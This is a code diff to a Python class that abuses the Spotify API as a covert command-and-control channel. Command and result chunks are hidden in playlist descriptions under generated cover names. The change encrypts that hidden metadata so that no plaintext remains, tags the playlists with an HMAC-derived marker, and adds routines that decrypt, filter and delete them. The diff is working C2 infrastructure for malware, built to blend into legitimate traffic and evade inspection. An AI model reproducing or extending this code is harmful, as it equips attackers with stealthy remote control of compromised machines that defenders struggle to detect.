@@ -436,16 +436,17 @@ class Spot:
 
     # --- C2 Channel Methods ---
 
-    def write_c2_playlists(self, chunks: list):
+    def write_c2_playlists(self, encrypted_descs: list):
         """Write C2 message chunks as playlists with cover names.
 
+        Descriptions are fully encrypted — no plaintext metadata.
+
         Args:
-            chunks: List of (chunk_data, metadata_json_str) tuples
+            encrypted_descs: List of encrypted description strings
                 from c2_protocol.chunk_payload().
         """
-        for chunk_data, meta_json in chunks:
+        for description in encrypted_descs:
             name = self._generate_cover_name()
-            description = chunk_data + MARKER_SEP + meta_json
             try:
                 playlist = self.spotipy.user_playlist_create(
                     self.username, name,
@@ -468,19 +469,59 @@ class Spot:
             time.sleep(0.1)
 
     def read_c2_playlists(self, channel: str,
+                          encryption_key: str,
                           seq: int = None) -> dict:
-        """Read C2 playlists filtered by channel and optional seq.
+        """Read C2 playlists, decrypting metadata to filter.
+
+        Uses HMAC-derived tag for fast identification, then
+        decrypts metadata to filter by channel and seq.
 
         Args:
             channel: Channel discriminator ("cmd" or "res").
+            encryption_key: Passphrase for decryption.
             seq: If given, only return playlists matching this seq.
 
         Returns:
             Dict mapping seq -> list of (chunk_data, metadata_dict).
         """
-        import json as _json
+        from c2_protocol import read_c2_descriptions
+
         playlists = self._get_all_playlists()
-        seq_groups = {}
+        desc_pairs = []
+
+        for p in playlists:
+            try:
+                full = self.spotipy.user_playlist(
+                    self.username, p['id']
+                )
+            except spotipy.SpotifyException:
+                continue
+            desc = html.unescape(full.get('description', ''))
+            desc_pairs.append((p['id'], desc))
+
+        return read_c2_descriptions(
+            desc_pairs, encryption_key,
+            channel=channel, seq=seq,
+        )
+
+    def clean_c2_playlists(self, channel: str,
+                           encryption_key: str,
+                           seq: int = None):
+        """Delete C2 playlists matching channel and optional seq.
+
+        Decrypts metadata to identify matching playlists.
+
+        Args:
+            channel: Channel discriminator ("cmd" or "res").
+            encryption_key: Passphrase for identification.
+            seq: If given, only delete playlists matching this seq.
+        """
+        from c2_protocol import (
+            compute_c2_tag, _decrypt_chunk_desc,
+        )
+
+        tag = compute_c2_tag(encryption_key)
+        playlists = self._get_all_playlists()
 
         for p in playlists:
             try:
@@ -491,54 +532,14 @@ class Spot:
                 continue
 
             desc = html.unescape(full.get('description', ''))
-            if MARKER_SEP not in desc:
+            if not desc.startswith(tag):
                 continue
 
-            parts = desc.split(MARKER_SEP, 1)
-            chunk_data = parts[0]
             try:
-                meta = _json.loads(parts[1])
-            except (_json.JSONDecodeError, IndexError):
-                continue
-
-            if meta.get('c') != channel:
-                continue
-            msg_seq = meta.get('seq')
-            if seq is not None and msg_seq != seq:
-                continue
-
-            if msg_seq not in seq_groups:
-                seq_groups[msg_seq] = []
-            seq_groups[msg_seq].append((chunk_data, meta))
-
-        return seq_groups
-
-    def clean_c2_playlists(self, channel: str, seq: int = None):
-        """Delete C2 playlists matching channel and optional seq.
-
-        Args:
-            channel: Channel discriminator ("cmd" or "res").
-            seq: If given, only delete playlists matching this seq.
-        """
-        import json as _json
-        playlists = self._get_all_playlists()
-
-        for p in playlists:
-            try:
-                full = self.spotipy.user_playlist(
-                    self.username, p['id']
+                meta, _ = _decrypt_chunk_desc(
+                    desc, encryption_key
                 )
-            except spotipy.SpotifyException:
-                continue
-
-            desc = full.get('description', '')
-            if MARKER_SEP not in desc:
-                continue
-
-            parts = desc.split(MARKER_SEP, 1)
-            try:
-                meta = _json.loads(parts[1])
-            except (_json.JSONDecodeError, IndexError):
+            except Exception:
                 continue
 
             if meta.get('c') != channel:
